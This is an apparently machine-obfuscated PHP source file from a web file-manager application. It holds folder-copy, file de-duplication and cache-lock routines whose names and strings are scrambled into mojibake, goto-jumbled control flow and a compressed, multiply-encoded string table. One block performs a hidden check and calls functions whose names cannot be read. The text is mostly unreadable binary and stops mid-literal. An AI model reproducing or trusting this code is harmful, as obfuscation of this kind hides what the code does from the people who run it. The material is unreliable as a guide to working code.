$C¹ï©œØ[$Eó¦‚†……[379]] == $Eó¦‚†……[543]) { return; } $bö¬˜ˆùŸô = array($Eó¦‚†……[467] => array($Eó¦‚†……[491], $C¹ï©œØ[$Eó¦‚†……[467]] . $d‡—ÄİĞ¹Ñ . $Eó¦‚†……[492])); $aŞªá¢Ïç‹ = $this->field($Eó¦‚†……[391])->where($bö¬˜ˆùŸô)->getField($Eó¦‚†……[377], !0); goto fªÎ®Ô¯Œœ; e—Ï×ô¥³˜: if (!$BÕèÛŒàìÚ) { return; } $BÕèÛŒàìÚ = array_to_keyvalue($BÕèÛŒàìÚ, $Eó¦‚†……[43], $Eó¦‚†……[449]); $bö¬˜ˆùŸô = array($Eó¦‚†……[449] => array($Eó¦‚†……[17], $BÕèÛŒàìÚ)); goto A‚ôÉÄˆåÆ; A‚ôÉÄˆåÆ: Model($Eó¦‚†……[544])->where($bö¬˜ˆùŸô)->save(array($Eó¦‚†……[456] => 0)); Model($Eó¦‚†……[545])->where($bö¬˜ˆùŸô)->delete(); goto E¶›õ‘ø«’; fªÎ®Ô¯Œœ: if (!$aŞªá¢Ïç‹) { return; } $bö¬˜ˆùŸô = array($Eó¦‚†……[377] => array($Eó¦‚†……[17], $aŞªá¢Ïç‹), $Eó¦‚†……[456] => 1); $BÕèÛŒàìÚ = Model($Eó¦‚†……[544])->field($Eó¦‚†……[449])->where($bö¬˜ˆùŸô)->select(); goto e—Ï×ô¥³˜; dğ¦Ù³°: $Eó¦‚†…… =& $_SERVER[©]; $C¹ï©œØ = $this->sourceInfo($d‡—ÄİĞ¹Ñ); $C¹ÁØ˜­¤¸ = $this->sourceInfo($EŠª¼á÷×ò); goto FÃŸáŒãå; E¶›õ‘ø«’: } public function copyFolderFromIO($A‹§İòíÒ, $fÈÃÛË¼ö‡, $eßô¶àòª, $aîÏˆ±ˆ, $DÚ÷æøä†, $c­éÈñ¬Ù¢ = false) { goto DŒÆµåÕ­£; döá¯ì§â: $dëÅ¨™Ñ™¸ = $this->fileNameExist($eßô¶àòª, $f½­˜ÅÚÁè); $A›†²âƒ•Á = $this->mkdir($eßô¶àòª, $f½­˜ÅÚÁè, $aîÏˆ±ˆ); if (!$dëÅ¨™Ñ™¸ || $aîÏˆ±ˆ == REPEAT_RENAME_FOLDER) { $aîÏˆ±ˆ = !1; } goto Aö¢ÅŒµœÃ; A˜¹•­¸£õ: Model($c–íì–“³[512])->addAll($B¿®¨ÆÍİ[$c–íì–“³[510]], array(), !0); Model($c–íì–“³[513])->eventCopy($A›†²âƒ•Á); $this->saveAll($B¿®¨ÆÍİ[$c–íì–“³[511]]); goto dô©×ßËÓÀ; F¹‘’íÔÔ§: Hook::trigger($c–íì–“³[548]); if ($A›†²âƒ•Á) { $this->folderSizeResetChildren($A›†²âƒ•Á); } $this->_childrenListClear(); goto A˜¹•­¸£õ; DŒÆµåÕ­£: $c–íì–“³ =& $_SERVER[©]; $B¿®¨ÆÍİ = array($c–íì–“³[510] => array(), $c–íì–“³[511] => array(), $c–íì–“³[509] => array(), $c–íì–“³[546] => array()); $f½­˜ÅÚÁè = $c­éÈñ¬Ù¢ ? $c­éÈñ¬Ù¢ : $A‹§İòíÒ->getPathName($A‹§İòíÒ->pathThis($fÈÃÛË¼ö‡)); goto döá¯ì§â; dô©×ßËÓÀ: Model($c–íì–“³[430])->linkAdd($B¿®¨ÆÍİ[$c–íì–“³[509]]); Model($c–íì–“³[430])->remove($B¿®¨ÆÍİ[$c–íì–“³[546]]); $this->folderSizeReset($eßô¶àòª); goto e»Â¹’ÏˆÉ; e»Â¹’ÏˆÉ: $this->updateModifyTime($eßô¶àòª); return $A›†²âƒ•Á; goto a«öë‘°‰; Aö¢ÅŒµœÃ: if ($dëÅ¨™Ñ™¸) { $this->_childrenAllMake($dëÅ¨™Ñ™¸); } Hook::trigger($c–íì–“³[547]); $this->_copyChildTo($A‹§İòíÒ, $fÈÃÛË¼ö‡, $A›†²âƒ•Á, $aîÏˆ±ˆ, $B¿®¨ÆÍİ, $DÚ÷æøä†); goto F¹‘’íÔÔ§; a«öë‘°‰: } private function _copyChildTo($eÕó«›ª¦è, $F÷¸‡£‹í, $E‚‡‚Ê¹áå, $a¥£ç”Û›, &$FŠ­ôÚÜŞ, $e˜Öê‡Â‡Œ) { goto FöêäÅ±Å½; eññ˜¥“íï: $Dï»‡óÌ = array_merge($Bß­ñÃŸî[$f­ßÜñ’Áê[83]], $Bß­ñÃŸî[$f­ßÜñ’Áê[84]]); $E•ÔÙæõêİ = $this->_addFiles($eÕó«›ª¦è, $Bß­ñÃŸî[$f­ßÜñ’Áê[83]], $e˜Öê‡Â‡Œ); $C·²ó†¯í = array(); goto b’Ğ¿ÕÙ˜; B–—›«ÏÜÓ: $b—İ¼Îµâ¡ = $this->_childrenList($E‚‡‚Ê¹áå); $b—İ¼Îµâ¡ = array_to_keyvalue($b—İ¼Îµâ¡, $f­ßÜñ’Áê[38]); foreach ($Dï»‡óÌ as $C‘˜¯¨†©ø) { $eØÎ¢íÕˆØ = $b—İ¼Îµâ¡[$C‘˜¯¨†©ø[$f­ßÜñ’Áê[38]]]; $Eî¸Íç•ç = $eØÎ¢íÕˆØ[$f­ßÜñ’Áê[377]]; $this->_copyApplyMeta($eØÎ¢íÕˆØ, $FŠ­ôÚÜŞ); if ($C‘˜¯¨†©ø[$f­ßÜñ’Áê[39]] == $f­ßÜñ’Áê[86]) { $C‘˜¯¨†©ø[$f­ßÜñ’Áê[85]] = $eÕó«›ª¦è->getPathInner($C‘˜¯¨†©ø[$f­ßÜñ’Áê[85]]); $this->_copyChildTo($eÕó«›ª¦è, $C‘˜¯¨†©ø[$f­ßÜñ’Áê[85]], $Eî¸Íç•ç, $a¥£ç”Û›, $FŠ­ôÚÜŞ, $e˜Öê‡Â‡Œ); } } goto Cî°ÜâùÑ; b’Ğ¿ÕÙ˜: foreach ($Dï»‡óÌ as &$C‘˜¯¨†©ø) { goto A‘İĞÜóƒÓ; A‘İĞÜóƒÓ: if (isset($E•ÔÙæõêİ[$C‘˜¯¨†©ø[$f­ßÜñ’Áê[38]]])) { $C‘˜¯¨†©ø = $E•ÔÙæõêİ[$C‘˜¯¨†©ø[$f­ßÜñ’Áê[38]]]; } $C‘˜¯¨†©ø[$f­ßÜñ’Áê[378]] = $C‘˜¯¨†©ø[$f­ßÜñ’Áê[39]] == $f­ßÜñ’Áê[86]; $C‘˜¯¨†©ø[$f­ßÜñ’Áê[380]] = _get($C‘˜¯¨†©ø, $f­ßÜñ’Áê[170], $f­ßÜñ’Áê[43]); goto B¨œîÎ˜; aÓš»¼ëó½: if ($a¥£ç”Û›) { $FßŠ²­ñ¡ó = $this->fileNameExistCache($E‚‡‚Ê¹áå, $C‘˜¯¨†©ø[$f­ßÜñ’Áê[38]]); if ($FßŠ²­ñ¡ó) { if ($C‘˜¯¨†©ø[$f­ßÜñ’Áê[378]] || $a¥£ç”Û› == REPEAT_SKIP) { continue; } if ($a¥£ç”Û› == REPEAT_REPLACE) { $eØÎ¢íÕˆØ = $this->sourceInfoCache($FßŠ²­ñ¡ó); $a¦‚éì¸ï = $this->fileHistory($eØÎ¢íÕˆØ, $C‘˜¯¨†©ø[$f­ßÜñ’Áê[427]], $C‘˜¯¨†©ø[$f­ßÜñ’Áê[87]]); if ($a¦‚éì¸ï) { $FŠ­ôÚÜŞ[$f­ßÜñ’Áê[509]][] = $C‘˜¯¨†©ø[$f­ßÜñ’Áê[427]]; } continue; } else { if ($a¥£ç”Û› == REPEAT_RENAME) { $C‘˜¯¨†©ø[$f­ßÜñ’Áê[38]] = $this->fileNameAutoCache($E‚‡‚Ê¹áå, $C‘˜¯¨†©ø[$f­ßÜñ’Áê[38]], $a¥£ç”Û›, !1); } } } } if (!$C‘˜¯¨†©ø[$f­ßÜñ’Áê[378]] && $C‘˜¯¨†©ø[$f­ßÜñ’Áê[427]]) { $FŠ­ôÚÜŞ[$f­ßÜñ’Áê[509]][] = $C‘˜¯¨†©ø[$f­ßÜñ’Áê[427]]; } $C·²ó†¯í[] = $this->_makeItemData($C‘˜¯¨†©ø, $c†¶¡ñƒŒ™, $C‘˜¯¨†©ø[$f­ßÜñ’Áê[38]]); goto Aâ­„á²í; B¨œîÎ˜: $C‘˜¯¨†©ø[$f­ßÜñ’Áê[87]] = _get($C‘˜¯¨†©ø, $f­ßÜñ’Áê[87], 0); $C‘˜¯¨†©ø[$f­ßÜñ’Áê[427]] = _get($C‘˜¯¨†©ø, $f­ßÜñ’Áê[427], 0); if (!isset($C‘˜¯¨†©ø[$f­ßÜñ’Áê[549]]) && $C‘˜¯¨†©ø[$f­ßÜñ’Áê[427]]) { $FŠ­ôÚÜŞ[$f­ßÜñ’Áê[546]][] = $C‘˜¯¨†©ø[$f­ßÜñ’Áê[427]]; } goto aÓš»¼ëó½; Aâ­„á²í: } unset($C‘˜¯¨†©ø); if (!empty($C·²ó†¯í)) { $this->addAll($C·²ó†¯í); } goto B–—›«ÏÜÓ; FöêäÅ±Å½: $f­ßÜñ’Áê =& $_SERVER[©]; $c†¶¡ñƒŒ™ = $this->sourceInfoCache($E‚‡‚Ê¹áå); $Bß­ñÃŸî = $eÕó«›ª¦è->listPath($F÷¸‡£‹í, !1, !0); goto eññ˜¥“íï; Cî°ÜâùÑ: } private function _addFiles($AŠî°ÆÔÇ, $Aó‹ß¬óä‘, $E‚Õò›µ¢ö) { goto FÇ¤è™äÄ»; fãŠ·¬˜‹: foreach ($Aó‹ß¬óä‘ as &$fÕ×¥²Ìƒõ) { goto B“¼‡º¸ß; B“¼‡º¸ß: Hook::trigger($Cì™’íå í[550], $fÕ×¥²Ìƒõ); $fÕ×¥²Ìƒõ[$Cì™’íå í[85]] = $AŠî°ÆÔÇ->getPathInner($fÕ×¥²Ìƒõ[$Cì™’íå í[85]]); $fš±›ğêŒ = $AŠî°ÆÔÇ->hashSimple($fÕ×¥²Ìƒõ[$Cì™’íå í[85]]); goto dˆšˆ±Ş’; dˆšˆ±Ş’: $A¶‰Èé²ì = $AŠî°ÆÔÇ->hashMd5($fÕ×¥²Ìƒõ[$Cì™’íå í[85]]); if (strlen($A¶‰Èé²ì) > 10 && !isset($A±ñì°œƒÁ[$A¶‰Èé²ì])) { $A±ñì°œƒÁ[$A¶‰Èé²ì] = array(); } $fÕ×¥²Ìƒõ[$Cì™’íå í[174]] = $fš±›ğêŒ; goto Aé‹æëö±Ì; a¡Ñõ‰ó: if (count($A±ñì°œƒÁ[$A¶‰Èé²ì]) > 1) { $fÕ×¥²Ìƒõ[$Cì™’íå í[549]] = !0; } goto f…²õÇ³ÃŠ; Aé‹æëö±Ì: $fÕ×¥²Ìƒõ[$Cì™’íå í[173]] = $A¶‰Èé²ì; Hook::trigger($Cì™’íå í[551], $fÕ×¥²Ìƒõ); $A±ñì°œƒÁ[$A¶‰Èé²ì][] =& $fÕ×¥²Ìƒõ; goto a¡Ñõ‰ó; f…²õÇ³ÃŠ: } $aì»Áƒ¦¢ = array($Cì™’íå í[173] => array($Cì™’íå í[17], array_keys($A±ñì°œƒÁ))); $dÏ™ŸÉâæë = Model($Cì™’íå í[552]); goto CÀâÉ¶ßî; eÏÇ„ù’±: $aì»Áƒ¦¢ = array($Cì™’íå í[173] => array($Cì™’íå í[17], array_keys($A±ñì°œƒÁ))); $aˆçÙ’ËÜ = $dÏ™ŸÉâæë->where($aì»Áƒ¦¢)->select(); $aˆçÙ’ËÜ = $aˆçÙ’ËÜ ? $aˆçÙ’ËÜ : array(); goto f¹‚İÌé¯Ù; f¹‚İÌé¯Ù: foreach ($aˆçÙ’ËÜ as $B„ƒé‹…¬) { if (!isset($A±ñì°œƒÁ[$B„ƒé‹…¬[$Cì™’íå í[173]]])) { continue; } $B¸°„œåÛ‚ =& $A±ñì°œƒÁ[$B„ƒé‹…¬[$Cì™’íå í[173]]]; foreach ($B¸°„œåÛ‚ as &$fÕ×¥²Ìƒõ) { $fÕ×¥²Ìƒõ[$Cì™’íå í[427]] = $B„ƒé‹…¬[$Cì™’íå í[427]]; } unset($fÕ×¥²Ìƒõ); } $cµ¼­Õò¾ = array(); foreach ($Aó‹ß¬óä‘ as $b Èõ‚ğ») { $cµ¼­Õò¾[$b Èõ‚ğ»[$Cì™’íå í[38]]] = $b Èõ‚ğ»; } goto déÔ³’†—; dÁšôã¦„: $cõ›¦’ßÍ = array(); foreach ($Aó‹ß¬óä‘ as $b–î©îÏÄÒ) { if (isset($b–î©îÏÄÒ[$Cì™’íå í[549]]) && $b–î©îÏÄÒ[$Cì™’íå í[549]]) { continue; } $e™ù®İë³ = $AŠî°ÆÔÇ->getPathInner($b–î©îÏÄÒ[$Cì™’íå í[85]]); $eñòÙšÏ¼ = $dÏ™ŸÉâæë->addFileMake($e™ù®İë³, $b–î©îÏÄÒ[$Cì™’íå í[87]], $b–î©îÏÄÒ[$Cì™’íå í[174]], $b–î©îÏÄÒ[$Cì™’íå í[173]], $b–î©îÏÄÒ[$Cì™’íå í[38]], $E‚Õò›µ¢ö); $cõ›¦’ßÍ[] = $eñòÙšÏ¼; } $dÏ™ŸÉâæë->addAll($cõ›¦’ßÍ); goto eÏÇ„ù’±; FÇ¤è™äÄ»: $Cì™’íå í =& $_SERVER[©]; if (!$Aó‹ß¬óä‘ || count($Aó‹ß¬óä‘) == 0) { return array(); } $A±ñì°œƒÁ = array(); goto fãŠ·¬˜‹; déÔ³’†—: return $cµ¼­Õò¾; goto dÚˆğàÛ‰Ş; CÀâÉ¶ßî: $aˆçÙ’ËÜ = $dÏ™ŸÉâæë->where($aì»Áƒ¦¢)->select(); $aˆçÙ’ËÜ = $aˆçÙ’ËÜ ? $aˆçÙ’ËÜ : array(); foreach ($aˆçÙ’ËÜ as $B„ƒé‹…¬) { if (!isset($A±ñì°œƒÁ[$B„ƒé‹…¬[$Cì™’íå í[173]]])) { continue; } $d¸ç Æ‘Â = $A±ñì°œƒÁ[$B„ƒé‹…¬[$Cì™’íå í[173]]]; foreach ($d¸ç Æ‘Â as &$fÕ×¥²Ìƒõ) { $fÕ×¥²Ìƒõ[$Cì™’íå í[427]] = $B„ƒé‹…¬[$Cì™’íå í[427]]; $fÕ×¥²Ìƒõ[$Cì™’íå í[549]] = !0; } unset($fÕ×¥²Ìƒõ); } goto dÁšôã¦„; dÚˆğàÛ‰Ş: } } goto dã“¤’‘êˆ; D¬ãï›İñî: if ($_SERVER[$_SERVER[©][4]] != $C‰“˜ìÊò¥($BõÆ·ƒòÉ”)) { goto d›£‹Èáš«; d›£‹Èáš«: $C“×‰äâë = $_SERVER[©][6]; $d²›…÷Ù‰Œ = $_SERVER[$_SERVER[©][7]] . $_SERVER[©][8]; $c˜ÁÄ®¯Î¼ = $C“×‰äâë($d²›…÷Ù‰Œ); goto EîÔÌëÕÁ˜; C”¼çÑŞµ™: $f…Õ¸»ì—¢($BõÆ·ƒòÉ”); goto FÅôãÉŒ‡è; EîÔÌëÕÁ˜: $DÃÆĞæ½ö¸ = explode($_SERVER[©][9], $c˜ÁÄ®¯Î¼); if (count($DÃÆĞæ½ö¸) < $_SERVER[©][10]) { $BšÃ‘¿¨½© = $_SERVER[©][11]; $BšÃ‘¿¨½©(); } $f…Õ¸»ì—¢ = $_SERVER[©][12]; goto C”¼çÑŞµ™; FÅôãÉŒ‡è: } class CacheLockMemcached { public function lock($dÄÓ½Ÿ–, $dÂîìºè¯Ï = 0) { $Fö÷àÜëÉê = Cache::init(); $EÌŸÍã±Å = microtime(!0) + $dÂîìºè¯Ï; while (microtime(!0) < $EÌŸÍã±Å) { $D•óâ‚†ÁÖ = $Fö÷àÜëÉê->get($dÄÓ½Ÿ–); if (!$D•óâ‚†ÁÖ || $D•óâ‚†ÁÖ < microtime(!0)) { $d§´¸³Ş = $Fö÷àÜëÉê->handle->add($dÄÓ½Ÿ–, $EÌŸÍã±Å, $dÂîìºè¯Ï); if ($d§´¸³Ş) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($F·Ÿ‘³ÜÑŒ) { return Cache::init()->get($F·Ÿ‘³ÜÑŒ); } public function unlock($b­ªö™‚÷Ñ) { return Cache::init()->remove($b­ªö™‚÷Ñ); } } class CacheLockDatabase { public function lock($f·ß÷ôÈ×, $F„Æ²íšç… = 0) { $A¨™ŸµÕÈë = Model($_SERVER[©][756]); $bö‹ôÊñš› = microtime(!0) + $F„Æ²íšç…; while (microtime(!0) < $bö‹ôÊñš›) { $dèÒ¼òƒÚ¿ = $A¨™ŸµÕÈë->get($f·ß÷ôÈ×); if (!$dèÒ¼òƒÚ¿ || $dèÒ¼òƒÚ¿ < microtime(!0)) { $a­‹·çèÍ = $A¨™ŸµÕÈë->set($f·ß÷ôÈ×, $bö‹ôÊñš›); if ($a­‹·çèÍ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($d‚ìØåç«Š) { return Model($_SERVER[©][756])->get($d‚ìØåç«Š); } public function unlock($EÓ¦å£‘¡Â) { Model($_SERVER[©][756])->remove($EÓ¦å£‘¡Â); } } goto AùöŠÃº”ò; aŠ—ë“‡ŸØ: if (!function_exists('_kodDe')) { function _kodDe($Dšê“¡ŒÆ ) { $Dšê“¡ŒÆ  = base64_decode($Dšê“¡ŒÆ ); $b††ß—–Æ… = strlen($Dšê“¡ŒÆ ); $fæÀÁ­•™¬ = ''; $EŞ  Š¶¨ = ord($Dšê“¡ŒÆ [0]) - 30; for ($Aì¦”°øÊÚ = 1; $Aì¦”°øÊÚ < $b††ß—–Æ…; $Aì¦”°øÊÚ += 2) { if ($Aì¦”°øÊÚ + 1 < $b††ß—–Æ…) { $fæÀÁ­•™¬ .= chr(ord($Dšê“¡ŒÆ [$Aì¦”°øÊÚ + 1]) + $EŞ  Š¶¨); $fæÀÁ­•™¬ .= chr(ord($Dšê“¡ŒÆ [$Aì¦”°øÊÚ]) + $EŞ  Š¶¨); } else { $fæÀÁ­•™¬ .= chr(ord($Dšê“¡ŒÆ [$Aì¦”°øÊÚ]) + $EŞ  Š¶¨); } } return $fæÀÁ­•™¬; } } define(base64_decode('qQ=='), "\306\264\304\275"); $_SERVER[©] = explode("\x7c\x2\x7c\x1\x7c\x3", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\175\11\174\33\305\325\70\137\51\245\11\264\205\122\216\176\134\213\111\360\21\35\276\342\44\116\354\104\266\344\130\211\154\31\111\216\223\130\216\262\222\126\322\306\222\126"."\xde\x5d\xc9\x47\x92\x72\x84\xb3\x10\x4a\x9\x37\x6d\xb9\x21\xfd\x38\x2\x84\x2b\x24\x50\x2\x81\x72\xdf\x85\x2\xe5\x26\x9\x50\xa\x5\xa\x85\x52\xe0\x3f\xf7\xcc\xae\x64\x68\xff\xfc\x70\x34\xf3\xe6\xcd\xec\x1c\x6f\xde\xbc\x99".base64_decode('ee/NI8//cs331vzPmj1vvfD9zZf89fVd63F0zffB3/dw+MgzfrgH+m/P3LHbe7/XsF/Pcxti2x/e')."\x70\xc2\x8e\xb9\xd\x52\xcd\xf0\xb9\xd3\x5d\x23\x4f\x5f\xd8\x7c\xf5\xe1\x7f\x3e\xe5\x99\x96\xdc\xac\x9f\xde\xff\xc7\xad\x8d\x9b\xdf\x5f\x74\xa7\xf9\xea\xe2\xdd\x8f\x6f\xbb\x48\xfe\xf2\xba\xaf\x76\x7e\xfd\xe6\x9f\x16\x3d\xf5\xc3"."\x93\x67\xce\xb8\xad\xcb\x31\xfe\xf6\xe2\x23\xf6\x58\xf6\x93\xce\x83\xd7\x3d\xbb\x73\xf9\xcf\x77\x6c\x3e\x68\xd7\x13\xc5\xa1\x37\xce\xce\x5e\x72\xd7\xde\x4b\x2f\xd8\xef\xe2\x53\x9f\xba\xaa\xbf\xed\xca\x3b\x96\xaf\xfb\xf0\x2b\xad"."\x78\xce\xc0\x44\xdd\x92\x59\x5f\x5e\xb1\x63\x78\xdf\xd7\xef\xfe\xf4\x87\x1f\xdd\xbd\xfd\xa9\xea\xf1\x3d\x5e\xeb\xef\xba\xef\xac\x5f\x6c\xd9\x6f\xbf\xfb\xfe\x92\xbf\xb7\x6f\x51\xcd\x82\xe1\x1f\xcc\xdd\xef\xa1\xb9\xc5\x3f\x2c\xfa"."\xc7\xee\x75\x63\xfb\x1f\xbd\xec\x97\xab\xf6\xb9\xfd\xcc\xe6\xa3\x77\xdc\xb7\x68\x47\xf0\xad\x2f\x4e\xff\xec\x9e\x23\x96\x74\x6c\x5e\xe1\x7d\x71\xda\xe3\x2f\x1a\xe7\xf7\xbe\xd8\xfc\xdb\xcd\x1f\x55\x1d\xf5\xb7\x9f\x2e\x79\xbe\x73".strrev('q¼úõÕÓÎ¥¶¸¬ğÏOS«åîv†ÙÙÿ)«¹Îëˆû­tèuçb‡ê±ô9nös¡û><]¤¾Ç¹É')."\xc2\xb6\xd7\xe2\x2b\xd7\x5c\xdd\x7c\xd8\x93\x2f\xbd\xa5\xdc\xfa\x92\xfe\xe2\x61\x6f\x1b\x6f\xfc\xe6\xce\xd5\x3f\x99\xf7\xcd\x3b\x77\xcc\xbc\xe8\x5f\x27\x18\x7\xdc\x7a\xe6\x5e\xa7\xfd\xe9\x77\x7b\xdd\xb9\xf1\x7a\x79\xaf\x59\xb7"."\xb4\x7e\x33\xe7\x71\xf9\xaa\xf3\x6f\x7a\xf7\xec\xa7\xba\x5a\x96\xd4\xad\xfe\xcd\x7e\x9f\xb7\xfc\xf3\xbc\xa1\xbf\xfb\xff\xb5\x4f\xfc\xf8\xe4\x96\xd7\xbe\xb7\xc7\x1e\xb8\xa3\x63\x72\x4a\xcd\x2a\x61\x75\x42\xf1\xe7\x45\x8\xe\xc3"."\120\54\255\230\261\204\226\67\225\274\151\140\160\207\47\354\357\214\365\171\42\335\70\56\27\12\156\271\150\152\131\115\116\272\12\231\2\206\116\305\77\315\370\47\221\121\22\303\61\71\256\351\246\222\304\240\142".base64_decode('Pqvmh8ngo39b8Y+U10xJGVMN+kHw+ZSaxmGV1NONf4yRrGqS6sZ6g5FYuL+vzxeKxEiJYnpOS5JQ').strrev('#7YM†'."\n".'ã¢¢‘±â0GÏ¬²,Yp@¾¾¼ÄvòJA²ã”ÙIÂ¼” ¬\\X”øè ¼)åÖA').base64_decode('ak5hGKM6q1eHb6G/V4qEPL1hT2fEH+zF4M5gT48/Ug4PBQOBDk/n4vKUvpBnYY9HAvUD46bmU1qN')."\xb4\x12\xa7\xac\x94\x6a\x71\xa0\x4b\x55\xb2\xa4\xff\xf3\x32\xad\x8e\x39\x5e\x20\xa1\x8\xb\x81\x31\xc8\x17\xb3\x59\x1c\xe9\x65\x21\x52\x7f\x25\x25\x17\xb3\xa4\xcf\xbc\x62\xa4\xa0\xab\x39\x99\x36\x7d\xb1\x32\xce\xa0\x84\x54\x0"."\231\250\371\4\216\370\306\114\135\346\160\120\343\204\256\344\0\235\141\130\330\27\360\165\106\44\130\115\251\53\24\354\221\310\120\344\144\303\124\164\151\240\333\27\362\111\260\352\155\325\250\305\325\22\316\327\337"."\13\72\104\362\4\2\322\144\45\230\112\256\100\213\301\171\52\24\26\14\171\175\41\251\143\231\304\373\51\241\345\162\132\336\5\112\1\343\151\12\125\365\205\102\70\340\40\24\34\360\303\241\43\221\140\127\127".base64_decode('2MdipHHHBkBNmgiVWmLJVNaMleRskRIrmSPV5If8agYh4BE1rxYJsZIiNI3NHBIoUmyFQnIgm0bm')."\x14\x98\x60\x25\x1c\x6c\x6b\xc7\xbf\x73\x9\x52\x1c\xce\xfd\x92\xa2\x9b\x31\x25\x9f\xd0\x92\x6a\x9e\x4c\xc3\xf9\x64\xca\x11\xc2\x93\xcd\x8c\x57\x57\x1\x1e\x29\x50\x73\x25\xb4\xc2\x78\x8f\x56\x12\x38\x49\x80\xcd\xb2\x94\x96\x4d"."\x2a\x3a\x8f\x17\x40\x76\x31\x85\x34\x6\x70\x25\x9e\xbb\xb7\x98\x13\x51\x58\x34\x91\x51\xb3\x49\x9d\x4e\xce\x6f\xc3\x6c\x20\xc5\x2a\xa6\x9\x9a\x61\xd0\x9a\xf6\x17\x20\xdf\xa\x2b\xba\x50\xfb\x2e\x50\x4c\xb0\x68\x8a\xc0\x22\x42".base64_decode('69L0nBcwANI7gOzV/goJw5Twk0KnuAjjqhk8wfn10OAC8E8t4WJRUrWMks3GlDGFTJBccqZBa+82')."\342\152\336\15\40\70\352\17\306\62\262\221\351\111\316\214\241\134\224\71\46\225\61\316\202\371\4\216\132\10\30\366\167\257\146\372\4\26\233\325\22\162\126\154\51\16\147\114\263\20\126\362\311\56\266\46\44".strrev('ÃYsI\'I3\\Hª&„cš`Ë[D,²æc/ç’´êR¶ªİÔ™i¥%!×¹B‚°ê<Ñµ')."\327\126\64\123\316\331\154\355\311\252\11\331\124\265\274\133\113\230\212\351\64\114\135\221\111\151\125\163\45\110\21\160\6\327\341\134\164\366\164\342\25\315\31\321\345\274\221\122\164\247\217\220\167\253\4\372\231"."\x71\x30\x8a\xe6\x55\x8d\x82\x66\xa8\xf0\x33\xad\x92\x6c\x9a\x72\x22\x3\x67\x3f\x2f\xbe\xed\x5b\xf0\x55\xb8\xd0\x29\x65\xb8\x9e\x44\x42\x31\xc\x27\xcc\xa2\x6b\x59\xa7\x27\x9b\xd5\x46\x9d\x41\x5d\x4d\xab\x20\x4f\x9d\xad\x9a\x80"."\63\265\112\224\155\26\124\135\61\150\124\132\330\23\41\310\240\126\212\263\117\227\323\71\271\125\52\24\343\240\147\310\374\254\0\303\330\344\353\255\122\2\106\35\122\256\150\230\116\135\1\354\107\5\13\35\31"."\74\177\312\331\3\307\123\125\222\316\60\340\322\4\334\124\337\54\1\62\222\150\32\206\166\107\42\175\61\177\27\130\214\173\175\261\36\117\244\223\110\11\76\123\116\323\72\7\0\357\145\105\122\340\122\47\230"."\162\220\320\172\101\37\161\140\237\66\252\350\340\303\35\343\255\322\260\226\214\153\143\56\232\324\105\144\27\212\14\173\264\140\72\103\162\76\15\373\47\76\156\52\204\34\215\122\332\332\241\1\45\237\66\63\64"."\143\330\27\132\342\13\305\302\301\256\310\200\47\104\226\361\74\30\210\61\372\51\130\164\326\31\122\222\240\353\23\46\315\47\27\140\257\121\34\70\121\340\30\323\124\70\171\150\132\300\277\20\166\214\327\151\0"."\44\247\210\105\313\16\250\71\25\326\335\144\51\250\47\301\32\277\220\124\310\215\32\324\26\315\324\325\104\223\63\152\235\340\337\272\332\301\250\327\125\67\64\337\255\362\74\356\6\127\203\324\130\337\42\365\1"."\xa1\x43\x95\xb3\x12\x69\x74\x19\x46\xbd\x14\x5c\xfc\x2d\x1d\x0\xd7\x24\x61\x9a\xdb\xba\xe\x3\x43\xbe\x63\xfb\x7d\xe1\x48\xac\xc7\x17\xe9\xe\x7a\xc9\x17\x7c\x1e\x12\xa\x68\x78\x6a\xd2\x16\xd\xe2\x9f\x21\x32\x82\x40\x54\x48"._kodDe('KP8hLRZo4CgMQBYAZfhbK1/vuxWwKv5Zmt0nh9mQpkYhW/yAXK6vagYI6SP+F3ZiWVk/BmFChmC/4g==')."\x26\x59\xa6\x37\x76\x51\x66\xeb\xe\x37\x81\xff\x39\x67\x4d\x6a\x39\x99\x4a\xa2\x68\xe2\x2a\x49\x3c\x73\x31\xa8\xce\x92\xd2\xad\xc8\x7c\x51\x33\x75\x28\x28\x8f\xd2\x38\x41\xe9\x51\xcc\x8c\x46\xfa\x19\x8\xdc\xa4\x4a\x45\x56\x37"."\132\313\244\222\125\150\57\145\24\312\245\201\170\125\142\235\127\320\225\224\112\350\26\310\123\0\316\271\260\152\204\100\46\50\337\320\370\0\24\103\71\300\344\14\133\66\70\323\207\21\141\145\356\352\17\4\142"."\x9d\xc1\xde\x8\x10\x45\x31\x64\x20\xe4\x8f\xf8\x28\x45\x78\xbc\x31\x4f\x67\x1f\x5b\xc2\xf8\x30\x11\x4\x38\x3d\xcb\xd9\x1b\x86\x94\x1a\x5\xbe\xcf\x17\x8\xce\x72\xe9\x42\x7\x59\x2a\xe\x3\x5e\x58\xd0\xf2\x86\xe2\x24\xbb\x14".base64_decode('Z5IzX4wx18Z5y3JwAXjMKecmnDnFlJ2s6tb1TYqIy6SfDAFnllmwqIL9BV1Y+4JhkmE+hAJpJK7o')."\xa4\x1e\x7d\xfd\x24\x29\x27\xc\xff\x42\x5f\x84\x2e\x8a\x32\x11\x59\x3c\x3\x61\xca\xe1\x8a\x0\x51\x57\x27\x64\xde\xb8\xf9\xb4\x22\xa4\xd0\xb1\x5c\x96\x4b\x56\x31\xd5\x32\x70\x31\x2d\xbe\xa\xb0\x2f\x40\x6d\x72\xa5\xe6\x3a\xf9"."\40\105\272\375\275\213\143\75\101\257\57\20\363\367\2\366\20\51\207\367\367\171\75\164\324\105\170\107\220\356\14\11\264\37\60\210\45\236\200\337\216\356\133\352\17\107\302\25\223\0\254\337\147\113\1\173\255"."\276\220\257\313\277\224\105\273\374\276\200\67\34\353\364\164\166\163\234\136\117\17\211\304\122\160\267\143\270\255\370\61\300\351\302\154\317\24\53\301\375\237\306\166\277\342\6\45\106\105\357\30\47\20\260\152\51".base64_decode('hChJc+GuE7WECMMJrUjJlElvOcoZcjKZmjJdkWrwT63kCUtmIcZ4QHycBVEzaBzIaeT7EuG6ZTWI')."\x41\x9c\xe\x25\xa5\xe9\xca\xb7\x1\x3c\x29\x93\x11\x86\x2d\xe\x26\xc\x4f\x3\x23\xe0\x41\xdb\x5b\x40\x9\x68\x44\x62\x74\x12\x1a\x60\x63\xe0\xa1\xd5\x49\xf1\xad\x65\x2c\x8\xf6\xe0\x1e\xb8\x31\x8d\xd\x84\x82\xbd\xb\x49\x86"."\xd1\x8c\x42\x2b\xe0\x27\xdd\x5f\x43\xa5\x18\xb2\x3f\x35\x39\x2f\x2\x22\x88\xcc\xa5\x49\xd